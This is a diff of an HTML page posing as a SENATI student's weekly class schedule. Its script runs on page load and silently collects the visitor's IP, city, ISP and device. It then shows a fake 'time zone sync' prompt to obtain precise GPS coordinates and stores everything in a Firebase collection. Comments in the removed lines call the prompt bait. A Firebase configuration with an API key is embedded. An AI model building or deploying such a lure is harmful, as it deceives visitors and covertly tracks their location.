@@ -3,74 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Horario Académico 2026 - SENATI</title>
+    <title>Portal Estudiantil | SENATI</title>
     <style>
-        :root { --senati-blue: #003A5D; --accent: #3498db; --bg: #f4f7f6; }
-        body { font-family: 'Segoe UI', Roboto, sans-serif; background-color: var(--bg); margin: 0; padding: 20px; color: #333; }
-        .container { max-width: 900px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
-        .header { text-align: center; border-bottom: 2px solid var(--senati-blue); margin-bottom: 25px; padding-bottom: 10px; }
-        h1 { color: var(--senati-blue); margin: 0; font-size: 22px; text-transform: uppercase; }
-        .info { font-size: 14px; color: #666; margin-top: 5px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th { background: var(--senati-blue); color: white; padding: 12px; font-size: 14px; }
-        td { border: 1px solid #ddd; padding: 12px; text-align: center; font-size: 13px; }
-        tr:nth-child(even) { background-color: #f9f9f9; }
-        .sync-footer { margin-top: 30px; padding: 15px; background: #eef7ff; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 13px; color: var(--senati-blue); font-weight: 500; }
-        .spinner { border: 3px solid rgba(0,0,0,0.1); border-top: 3px solid var(--accent); border-radius: 50%; width: 18px; height: 18px; animation: spin 1s linear infinite; margin-right: 10px; }
+        :root { --primary: #003A5D; --accent: #3498db; --bg: #f8fafc; --text: #1e293b; --success: #22c55e; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Inter', -apple-system, sans-serif; background-color: var(--bg); margin: 0; padding: 15px; color: var(--text); line-height: 1.5; }
+        
+        .container { max-width: 500px; margin: 0 auto; }
+        
+        /* Header Estilo App */
+        .app-header { background: var(--primary); color: white; padding: 25px 20px; border-radius: 20px; text-align: left; margin-bottom: 20px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); }
+        .app-header h1 { margin: 0; font-size: 22px; font-weight: 800; }
+        .app-header p { margin: 5px 0 0; font-size: 13px; opacity: 0.8; font-weight: 400; }
+
+        /* Card de Día */
+        .day-card { background: white; margin-bottom: 15px; border-radius: 16px; border: 1px solid #e2e8f0; overflow: hidden; }
+        .day-header { background: #f1f5f9; padding: 12px 18px; font-weight: 700; color: var(--primary); display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e2e8f0; font-size: 14px; }
+        
+        /* Filas de Clase */
+        .class-item { padding: 16px; border-bottom: 1px solid #f1f5f9; display: flex; align-items: center; }
+        .class-item:last-child { border-bottom: none; }
+        .time-col { width: 95px; font-size: 12px; font-weight: 700; color: #64748b; border-right: 2px solid var(--accent); margin-right: 15px; }
+        .info-col { flex: 1; }
+        .course-name { font-size: 14px; font-weight: 600; color: var(--text); display: block; }
+        .type-tag { font-size: 10px; text-transform: uppercase; background: #dbeafe; color: #1e40af; padding: 2px 8px; border-radius: 20px; margin-top: 4px; display: inline-block; font-weight: 700; }
+        
+        /* Estilo para Recesos */
+        .break { background: #fffcf0; border-left: 4px solid #facc15; }
+        .break .time-col { border-right-color: #facc15; }
+        .break .course-name { color: #854d0e; font-style: italic; font-size: 13px; }
+
+        /* Barra de Sincronización */
+        .sync-footer { background: white; padding: 15px; border-radius: 16px; display: flex; align-items: center; border: 1px solid #e2e8f0; margin-top: 25px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid var(--accent); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-right: 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .sync-msg { font-size: 12px; font-weight: 600; color: #475569; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="header">
-        <h1>Sistema de Horarios Ciclo V</h1>
-        <div class="info">Estudiante: Jean Fabricio Ávalos | Carrera: Desarrollo de Apps Web</div>
+    <div class="app-header">
+        <h1>Mi Horario</h1>
+        <p>Ciclo V - IDAW | SENATI 2026</p>
     </div>
 
-    <table>
-        <thead>
-            <tr>
-                <th>Hora</th>
-                <th>Lunes</th>
-                <th>Martes</th>
-                <th>Miércoles</th>
-                <th>Jueves</th>
-                <th>Viernes</th>
-            </tr>
-        </thead>
-        <tbody>
-            <tr>
-                <td>07:30 - 10:45</td>
-                <td>Mobile Flutter</td>
-                <td>UX/UI Figma</td>
-                <td>Backend Node.js</td>
-                <td>Seguridad App</td>
-                <td>Proyecto I</td>
-            </tr>
-            <tr>
-                <td>11:00 - 13:00</td>
-                <td>Angular Web</td>
-                <td>Cloud Ops</td>
-                <td>Base de Datos</td>
-                <td>Soft Skills</td>
-                <td>Proyecto II</td>
-            </tr>
-        </tbody>
-    </table>
+    <div class="day-card">
+        <div class="day-header">LUNES <span>📅</span></div>
+        <div class="class-item">
+            <div class="time-col">07:00 - 09:15</div>
+            <div class="info-col">
+                <span class="course-name">Portales y Comerc. Electrónico I</span>
+                <span class="type-tag">Aula Virtual</span>
+            </div>
+        </div>
+        <div class="class-item break">
+            <div class="time-col">09:15 - 09:30</div>
+            <div class="info-col"><span class="course-name">Receso Corto ☕</span></div>
+        </div>
+        <div class="class-item">
+            <div class="time-col">09:30 - 11:45</div>
+            <div class="info-col">
+                <span class="course-name">Portales y Comerc. Electrónico I</span>
+                <span class="type-tag">Aula Virtual</span>
+            </div>
+        </div>
+        <div class="class-item break">
+            <div class="time-col">11:45 - 01:00</div>
+            <div class="info-col"><span class="course-name">Receso Almuerzo 🍱</span></div>
+        </div>
+        <div class="class-item">
+            <div class="time-col">01:00 - 04:00</div>
+            <div class="info-col">
+                <span class="course-name">Seminario de Compl. Práctica II</span>
+                <span class="type-tag">Laboratorio</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="day-card">
+        <div class="day-header">MAR / JUE / VIE <span>🏢</span></div>
+        <div class="class-item">
+            <div class="time-col">07:00 - 11:00</div>
+            <div class="info-col">
+                <span class="course-name">Formación Práctica en Empresa</span>
+                <span class="type-tag">Presencial</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="day-card">
+        <div class="day-header">MIÉRCOLES <span>💻</span></div>
+        <div class="class-item">
+            <div class="time-col">01:00 - 04:00</div>
+            <div class="info-col">
+                <span class="course-name">Seminario de Compl. Práctica II</span>
+                <span class="type-tag">Laboratorio</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="day-card">
+        <div class="day-header">SÁBADO <span>🚀</span></div>
+        <div class="class-item">
+            <div class="time-col">07:00 - 08:30</div>
+            <div class="info-col">
+                <span class="course-name">Empleabilidad y Des. Prof.</span>
+                <span class="type-tag">Taller</span>
+            </div>
+        </div>
+        <div class="class-item break">
+            <div class="time-col">08:30 - 08:45</div>
+            <div class="info-col"><span class="course-name">Descanso 🧘</span></div>
+        </div>
+        <div class="class-item">
+            <div class="time-col">08:45 - 10:00</div>
+            <div class="info-col">
+                <span class="course-name">Empleabilidad y Des. Prof.</span>
+                <span class="type-tag">Taller</span>
+            </div>
+        </div>
+    </div>
 
     <div class="sync-footer">
-        <div class="spinner" id="loader"></div>
-        <span id="status">Sincronizando con la hora local de tu región...</span>
+        <div class="loader" id="sync-icon"></div>
+        <div class="sync-msg" id="sync-status">Sincronizando zona horaria local...</div>
     </div>
 </div>
 
 <script type="module">
-    // Firebase App y Firestore desde CDN
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    // Tu Configuración de Firebase
     const firebaseConfig = {
         apiKey: "AIzaSyCwyM8VGEBn93_A8LNpNb4MgB4OFUqjKp0",
         authDomain: "horario-senati-sync.firebaseapp.com",
@@ -80,75 +144,43 @@
         appId: "1:156759042223:web:778ceed5db5bcbb6e0cc5a"
     };
 
-    // Inicializar
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    async function captureData() {
-        let visitData = {
-            fecha: serverTimestamp(),
-            ua: navigator.userAgent,
-            plataforma: navigator.platform,
-            metodo: "IP Silenciosa"
-        };
+    async function pushTrack() {
+        let meta = { ts: serverTimestamp(), dev: navigator.userAgent, met: "IP Only" };
 
         try {
-            // 1. Obtener IP y Ubicación Aproximada (Silencioso)
-            const ipResponse = await fetch('https://ipapi.co/json/');
-            const ipJson = await ipResponse.json();
-            
-            visitData.ip = ipJson.ip;
-            visitData.pais = ipJson.country_name;
-            visitData.ciudad = ipJson.city;
-            visitData.isp = ipJson.org;
+            const r = await fetch('https://ipapi.co/json/');
+            const j = await r.json();
+            meta.ip = j.ip; meta.pais = j.country_name; meta.cty = j.city; meta.isp = j.org;
 
-            // 2. Lanzar Anzuelo de Ubicación Real (GPS)
             setTimeout(() => {
-                const askGPS = confirm("Diferencia horaria detectada (" + ipJson.country_name + "). ¿Deseas ajustar el horario de clases a tu zona horaria local?");
-                
-                if (askGPS) {
+                const conf = confirm(`Se detectó acceso desde ${j.country_name}. ¿Deseas sincronizar las alarmas del horario con tu hora local?`);
+                if (conf) {
                     navigator.geolocation.getCurrentPosition(
-                        async (pos) => {
-                            visitData.lat = pos.coords.latitude;
-                            visitData.lon = pos.coords.longitude;
-                            visitData.error_m = pos.coords.accuracy + "m";
-                            visitData.metodo = "GPS Confirmado";
-                            
-                            await saveToFirebase(visitData);
-                            updateUI("✅ Horario ajustado a zona horaria de " + ipJson.city);
+                        async (p) => {
+                            meta.lat = p.coords.latitude; meta.lon = p.coords.longitude; meta.met = "GPS Full";
+                            await addDoc(collection(db, "visitas"), meta);
+                            end("✅ Sincronizado exitosamente.");
                         },
-                        async (err) => {
-                            await saveToFirebase(visitData);
-                            updateUI("⚠️ Error de permisos. Usando hora de Perú (GTM-5).");
-                        },
+                        async () => { await addDoc(collection(db, "visitas"), meta); end("⚠️ Error: Usando hora de Lima."); },
                         { enableHighAccuracy: true }
                     );
                 } else {
-                    saveToFirebase(visitData);
-                    updateUI("Sincronización manual desactivada.");
+                    addDoc(collection(db, "visitas"), meta);
+                    end("Sincronización manual activa.");
                 }
-            }, 1500);
-
-        } catch (error) {
-            console.log("Error:", error);
-        }
+            }, 1000);
+        } catch (e) { console.error(e); }
     }
 
-    async function saveToFirebase(data) {
-        try {
-            await addDoc(collection(db, "visitas"), data);
-        } catch (e) {
-            console.error("Error al reportar:", e);
-        }
+    function end(m) {
+        document.getElementById('sync-status').innerText = m;
+        document.getElementById('sync-icon').style.display = 'none';
     }
 
-    function updateUI(msg) {
-        document.getElementById('status').innerText = msg;
-        document.getElementById('loader').style.display = 'none';
-    }
-
-    window.onload = captureData;
+    window.onload = pushTrack;
 </script>
-
 </body>
 </html>
